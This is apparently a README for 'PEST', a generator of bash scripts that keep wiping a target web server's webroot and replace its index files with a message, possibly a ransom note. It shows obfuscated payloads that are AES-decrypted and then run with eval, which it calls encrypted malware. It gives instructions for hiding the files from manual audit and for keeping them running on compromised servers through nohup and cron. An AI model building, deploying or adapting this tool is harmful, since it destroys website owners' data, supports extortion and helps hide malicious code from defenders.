# PEST

This is for **educational purposes** only. I bear no responsibility for what you use this for. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.

This is a fire and forget way to keep a webmaster confused.

Using the build tool, you can generate three different types of bash files that will perform differently.

- Loop wiper : Will consistently wipe the webroot and replace the index.php/index.html with a custom message. Runs in an infinite loop.

- Cron wiper : Same as the **loop**, but runs only once as it is intended to be added as a cron job.

# How it works

A developer will get a message on the web root in an `index.php` and `index.html` file. No matter what he/she does, They cannot get rid of those files. They back after being deleted and no other file can be uploaded. Any file uploaded to the web root also gets deleted almost immediately.

# Usage

As usual, to see usage,

```bash
$ ./pest -h
```
or
```bash
$ ./pest --help
```

To build the final product you need the following

- The webroot path
- A custom message (A ransom message maybe)
- Sleep time in seconds (This **ONLY** for loop wiper). This serves as a delay between each run.

Then you get a copy of **pest** either by cloning this repo or just copying and pasting the code.

Make it executable by running

```bash
$ chmod +x pest
```

To build a **loop wiper**, run:

```bash
$ ./pest -o './.loop_wiper' --type loop --target '/home/test/public_html' --message 'Pwned' --sleep 20
```

A file named **".loop_wiper"** will be created. It's contents will look like this

```bash
#!/usr/bin/env bash
decrypted=$(printf "%s" "W+he7Uqi3ikGjXGzXBePZ+fYDatV1LbrcDr/yIxwDi2DpL/BCFW/E6eqnZwvOFRY
4rK5AAENxiNA04Vl53lX5vPyGS311mf7PtMr8B5s69fmLUWIXtxFB5R2plpssbNK
egc4N0V0ARZBeZiWUMZwMBzCEwED4CUdUXUTK5rkiDrJZDWSzXSN0AfYMCzroLDR
0mM3cWyJGlS1Q7vUCCwSFPBoR1dqmz1bBNu5m0meyzTtgK5Zp+r3oQtBPtrtU3M7
jCMNVADVchN/h/13Qu5p5y+K+b6FyTdeC9WK63geRwxtYwG+fPl+OLJia/v5P1ai
tl30B1kOMC3MVb7uqNlqvadM15AUDqf2he13F7xKVIvPRfjJWXXIBKR06Jb7luNb
XXKiavdZLQ1cSa228BmLq82OO5YMJkIpz3/5mQIc90x6RuXFLUUZKeAg20KMsdak
nHT24WyIYefs/yfSQTX2mPp3apyTpWBSKoqwM2cpKv0g0u2OuR/HXW2eh2qaVZUe
5+5LlogpyYO1tQq021Av3UCITlyP72ntB2N7xyUNTZz2SfZj964gmnxvjyTLUIF3
Fy23Qo0I5KIra0N2gfdvyrWq87FuPaikefZ/R4JwpQOmVQOv6b3kmKazwZsk53Vz
9L+nj5oi6WeKS9PhSZc/afhVVjIFecM5gjjeeH7Vc/IWrGnTm/ysUF/axqgYf3mM
FgQTDUE8W4uqg0mtpJ/3YQ==" | openssl enc -aes-256-cbc -K "15e05fe50a515531dff8ad9cdbcf436f9c58cc42a957deb234e893a1eeeb6a29" -iv "987fe6150619524e9808de0f73e82958" -d -a);
eval "$decrypted";
```


To build a **cron wiper**, run:

```bash
$ ./pest -o './.cron_wiper' --type cron --target '/home/test/public_html' --message 'Pwned'
```

A file named **".cron_wiper"** will be created. It's contents will look like something similar to this  

```bash
#!/usr/bin/env bash
decrypted=$(printf "%s" "jWEooyZX/90ZzRmU5R7cLADvaPnOXfsM3uDcSDy6N5mNbUHxy60P+T3XhnDvC5R0
tc/teiUwRGgYGRnhqpSNfddfvrSwdmolZdpAGxQqUqVtP0VW+BwoCPpwHKbVxkeQ
N34d/kIgrw13dqKd42GW5RZrNpOtC9KXvquM9SOsKM3SvR2BtX6X9gdhUCr5qC+y
NDnIIkuPL6r6gsZsT4dcb3X8kZw60tTodE/ZrkTWfRYpVQiRk7jKxbPBBFcysLef
xSxyi4/06OQaF4ubqdtBEewyjq2xDqnQevECkH3Mh1UBtbZBOewOJ+tDlW7/PY7O
jhA0+7cDfzyk9lJQ6FEiLqoU8MgCwWKBx/BYZ2gsZSpABFBRdcrY0FsosJ8lwrBO
sMn3WFFxh2G+EAdjkq+JOlVwvl+Kq2KovTQ5v2dnKOBYtyf0nfOiceUvQcawPuuy
PIxjRx3ohE9q+6H1y/81H1SKUHhQaFAOPACdFkZqXjOzEzvSdWXLnt8NctA7kHxt
f+qDnwaMmDhTev66WtV8Nv37i19asPWXXInISAdLVScrEiIAodVhnO4Hvddwotbs
TlMBsUP8ydfIkmLq0Auj6bDR9yWPEkcjFGaRVdzU9x8=" | openssl enc -aes-256-cbc -K "b13bb24222c310030f50cd6643b8c9f07b69342318c2e060b95176b644832d39" -iv "372ce7a88dab703e9ad86eb0f802fe49" -d -a);
eval "$decrypted";
```

**NOTE**: The path you pass via --target should be a path that exists on your target server.

Yes. It's an encrypted malware.

## Obfuscation
It is important you obfuscate these generated files by changing the file names, making them dot files and adding useless whitespace and comments at the top of the file to distract during manual audit.

Also note that the cron wiper is discouraged as it raises attention and is quick to spot.

## Using the generated files
To run the loop_wiper, upload the generated **.loop_wiper** file to the target server and make it executable by running  

```bash
$ chmod +x .loop_wiper
```

then run the following command on the target server

```bash
$ nohup ./.loop_wiper & disown
```

To run the .cron_wiper, **add it the the list of cron jobs**. Using the cpanel or **crontab** command.

If you find this page confusing, or you have no idea what's going on, you should not be here at all. I know, it feels frustrating and you feel left out, and that's okay. Go build a website or an app.

